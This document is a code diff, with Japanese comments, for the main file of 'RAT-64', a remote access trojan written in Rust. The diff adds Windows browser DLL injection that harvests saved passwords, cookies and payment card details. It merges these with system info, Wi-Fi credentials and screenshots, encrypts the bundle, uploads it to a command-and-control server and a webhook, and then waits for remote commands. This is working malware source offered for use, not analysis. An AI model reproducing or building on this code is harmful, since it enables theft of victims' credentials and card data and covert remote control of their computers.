@@ -1,153 +1,184 @@
-// RAT-64 - モジュール化された統合システム情報収集ツール
+// RAT-64 - 統合システム情報収集ツール
 use rmp_serde::encode::to_vec as to_msgpack_vec;
 use rand::RngCore;
 use rat_64::{
-    encrypt_data_with_key, 
-    load_config_or_default, 
-    IntegratedPayload, 
-    send_unified_webhook,
-    execute_rat_operations,
-    C2Client
+    encrypt_data_with_key, load_config_or_default, IntegratedPayload, 
+    send_unified_webhook, execute_rat_operations, C2Client
 };
+
+#[cfg(windows)]
+use rat_64::services::{BrowserInjector, BrowserData};
 
 #[tokio::main]
 async fn main() -> Result<(), Box<dyn std::error::Error>> {
-    println!("🦀 RAT-64 システム情報収集ツール (強化版) 起動中...");
+    println!("🦀 RAT-64 起動中...");
     
-    // 設定読み込み
     let config = load_config_or_default();
     println!("✅ 設定読み込み完了");
     
-    // 設定検証
     if let Err(e) = rat_64::core::config::validate_config(&config) {
         println!("❌ 設定エラー: {}", e);
         return Ok(());
     }
 
-    // C2クライアントの初期化
     let mut c2_client = C2Client::new(config.clone());
     
-    // 統合データ収集（メイン処理）
+    // ブラウザDLL注入（Windows環境のみ）
+    let dll_browser_data = collect_browser_data_via_dll().await;
+    
+    // データ収集とC2処理
+    println!("🔍 データ収集開始...");
+    if let Err(e) = perform_main_data_collection(&config, &mut c2_client, dll_browser_data.as_ref()).await {
+        eprintln!("❌ データ収集エラー: {}", e);
+        return Ok(());
+    }
+    
     if config.command_server_enabled {
-        println!("🔍 データ収集開始...");
-        match perform_main_data_collection(&config, &mut c2_client).await {
-            Ok(()) => println!("✅ データ収集完了"),
-            Err(e) => {
-                eprintln!("❌ データ収集エラー: {}", e);
-                return Ok(());
-            }
-        }
-        
-        // データ収集完了後、C2待機状態に移行
-        println!("\n🎯 データ収集完了 - C2待機モードに移行");
+        println!("🎯 C2待機モードに移行");
         if let Err(e) = c2_client.start_c2_loop().await {
-            eprintln!("🎯 C2 error: {}", e);
+            eprintln!("❌ C2エラー: {}", e);
         }
     } else {
-        // C2機能が無効な場合は一回限りの実行
-        println!("🔍 データ収集開始（一回限り実行）...");
-        match perform_main_data_collection(&config, &mut c2_client).await {
-            Ok(()) => println!("✅ データ収集完了"),
-            Err(e) => eprintln!("❌ データ収集エラー: {}", e),
-        }
-        println!("🎯 C2機能が無効のため終了します");
+        println!("🎯 実行完了");
     }
     
     Ok(())
 }
 
+/// ブラウザDLL注入でデータ収集（Windows専用）
+#[cfg(windows)]
+async fn collect_browser_data_via_dll() -> Option<BrowserData> {
+    println!("🌐 ブラウザDLL注入処理開始...");
+    
+    match BrowserInjector::new() {
+        Ok(injector) => match injector.inject_all_browsers().await {
+            Ok(data) => {
+                println!("✅ ブラウザDLL注入処理完了");
+                Some(data)
+            }
+            Err(e) => {
+                println!("❌ DLL注入エラー: {}", e);
+                None
+            }
+        },
+        Err(e) => {
+            println!("❌ インジェクタ初期化エラー: {}", e);
+            None
+        }
+    }
+}
+
+#[cfg(not(windows))]
+async fn collect_browser_data_via_dll() -> Option<()> {
+    None
+}
+
+/// DLL注入で収集したブラウザデータをメインペイロードに統合
+#[cfg(windows)]
+fn integrate_dll_browser_data(payload: &mut IntegratedPayload, dll_data: &BrowserData) {
+    println!("🔗 DLL注入データ統合中...");
+    
+    // パスワード統合
+    for password in &dll_data.passwords {
+        payload.auth_data.passwords.push(format!(
+            "[DLL_DECRYPTED] {}|{}|{}", 
+            password.origin, password.username, password.password
+        ));
+    }
+    
+    // クッキー統合
+    for cookie in &dll_data.cookies {
+        payload.auth_data.passwords.push(format!(
+            "[DLL_COOKIE] {}|{}|{}", 
+            cookie.host, cookie.name, cookie.value
+        ));
+    }
+    
+    // 支払い情報統合
+    for payment in &dll_data.payments {
+        payload.auth_data.passwords.push(format!(
+            "[DLL_PAYMENT] {}|{}|{}|{}", 
+            payment.card_number, payment.name_on_card, 
+            payment.expiration_month, payment.expiration_year
+        ));
+    }
+    
+    let total = dll_data.passwords.len() + dll_data.cookies.len() + dll_data.payments.len();
+    println!("   ✅ DLL統合: {}件 (パスワード:{}, クッキー:{}, 支払い:{})", 
+        total, dll_data.passwords.len(), dll_data.cookies.len(), dll_data.payments.len());
+}
+
 /// メインのデータ収集処理
 async fn perform_main_data_collection(
     config: &rat_64::Config, 
+    c2_client: &mut C2Client,
+    #[cfg(windows)] dll_browser_data: Option<&rat_64::services::BrowserData>,
+    #[cfg(not(windows))] _dll_browser_data: Option<&()>,
+) -> Result<(), Box<dyn std::error::Error>> {
+    let mut payload = IntegratedPayload::create_with_config(&config).await?;
+    // 収集データの統合
+    
+    // DLL注入データ統合
+    #[cfg(windows)]
+    if let Some(dll_data) = dll_browser_data {
+        integrate_dll_browser_data(&mut payload, dll_data);
+    }
+    
+    let final_count = payload.auth_data.passwords.len();
+    println!("✅ データ収集完了: システム:{}, 認証:{}件, WiFi:{}件, スクリーン:{}件",
+        payload.system_info.hostname,
+        final_count,
+        payload.auth_data.wifi_creds.len(),
+        payload.screenshot_data.as_ref().map(|s| s.total_count).unwrap_or(0)
+    );
+    
+    // データ暗号化・保存・送信
+    process_and_save_data(payload, config, c2_client).await?;
+    
+    // 実行結果サマリー
+    println!("� 実行結果サマリー:");
+    match execute_rat_operations(&config).await {
+        Ok(summary) => println!("{}", summary),
+        Err(e) => println!("❌ サマリー生成エラー: {}", e),
+    }
+    
+    println!("🎯 RAT-64 メイン処理完了！");
+    Ok(())
+}
+
+/// データの暗号化・保存・送信処理
+async fn process_and_save_data(
+    mut payload: rat_64::IntegratedPayload, 
+    config: &rat_64::Config, 
     c2_client: &mut C2Client
 ) -> Result<(), Box<dyn std::error::Error>> {
-    match IntegratedPayload::create_with_config(&config).await {
-        Ok(mut payload) => {
-            println!("✅ データ収集完了:");
-            println!("   - システム情報: {}", payload.system_info.hostname);
-            println!("   - パスワード: {}件", payload.auth_data.passwords.len());
-            println!("   - WiFi認証: {}件", payload.auth_data.wifi_creds.len());
-            
-            if let Some(ref screenshot_data) = payload.screenshot_data {
-                println!("   - スクリーンショット: {}件", screenshot_data.total_count);
-            }
-            
-            // データ暗号化
-            println!("🔒 データ暗号化中...");
-            let serialized = match to_msgpack_vec(&payload) {
-                Ok(data) => data,
-                Err(e) => {
-                    println!("❌ シリアル化エラー: {}", e);
-                    return Ok(());
-                }
-            };
-            let (encrypted, encryption_key, encryption_nonce) = match encrypt_with_random_key(&serialized) {
-                Ok(data) => data,
-                Err(e) => {
-                    println!("❌ 暗号化エラー: {}", e);
-                    return Ok(());
-                }
-            };
-            
-            // デバッグ用：キーとナンスを出力（本番環境では削除）
-            #[cfg(debug_assertions)]
-            {
-                println!("🔑 DEBUG - Key: {}", base64::Engine::encode(&base64::engine::general_purpose::STANDARD_NO_PAD, &encryption_key));
-                println!("🎲 DEBUG - Nonce: {}", base64::Engine::encode(&base64::engine::general_purpose::STANDARD_NO_PAD, &encryption_nonce));
-            }
-            
-            // キーとノンスをペイロードに設定
-            payload.set_encryption_info(&encryption_key, &encryption_nonce);
-            
-            println!("✅ データ暗号化完了 ({}バイト)", encrypted.len());
-            
-            // C2サーバーにデータをアップロード
-            if config.command_server_enabled {
-                match c2_client.upload_collected_data(&payload).await {
-                    Ok(()) => println!("✅ データサーバーアップロード成功"),
-                    Err(e) => println!("❌ データサーバーアップロード失敗: {}", e),
-                }
-            }
-            
-            // ファイル保存
-            let output_file = "data.dat";
-            match std::fs::write(output_file, &encrypted) {
-                Ok(()) => println!("💾 暗号化データを{}に保存完了", output_file),
-                Err(e) => println!("❌ ファイル保存エラー: {}", e),
-            }
-            
-            // Webhook送信
-            if config.webhook_enabled {
-                println!("📡 Webhook送信中...");
-                match send_unified_webhook(&payload, &config).await {
-                    Ok(()) => println!("✅ Webhook送信成功"),
-                    Err(e) => println!("❌ Webhook送信失敗: {}", e),
-                }
-            } else {
-                println!("ℹ️  Webhook送信は無効化されています");
-            }
-            
-            // 実行結果サマリー
-            println!("\n📊 実行結果サマリー:");
-            match execute_rat_operations(&config).await {
-                Ok(summary) => println!("{}", summary),
-                Err(e) => println!("❌ サマリー生成エラー: {}", e),
-            }
-        }
-        Err(e) => {
-            println!("❌ データ収集エラー: {}", e);
-            return Ok(()); // エラーが発生してもプログラム自体は正常終了
+    println!("🔒 データ暗号化中...");
+    
+    let serialized = to_msgpack_vec(&payload)?;
+    let (encrypted, key, nonce) = encrypt_with_random_key(&serialized)?;
+    payload.set_encryption_info(&key, &nonce);
+    
+    println!("✅ データ暗号化完了 ({}バイト)", encrypted.len());
+    
+    // C2アップロード
+    if config.command_server_enabled {
+        match c2_client.upload_collected_data(&payload).await {
+            Ok(()) => println!("✅ データサーバーアップロード成功"),
+            Err(e) => println!("❌ データサーバーアップロード失敗: {}", e),
         }
     }
     
-    println!("\n🎯 RAT-64 メイン処理完了！");
+    // ファイル保存
+    std::fs::write("data.dat", &encrypted)?;
+    println!("💾 暗号化データをdata.datに保存完了");
     
-    // デバッグ用：少し待機
-    #[cfg(debug_assertions)]
-    {
-        println!("Press any key to exit...");
-        let mut input = String::new();
-        std::io::stdin().read_line(&mut input).ok();
+    // Webhook送信
+    if config.webhook_enabled {
+        println!("📡 Webhook送信中...");
+        match send_unified_webhook(&payload, &config).await {
+            Ok(()) => println!("✅ Webhook送信成功"),
+            Err(e) => println!("❌ Webhook送信失敗: {}", e),
+        }
     }
     
     Ok(())
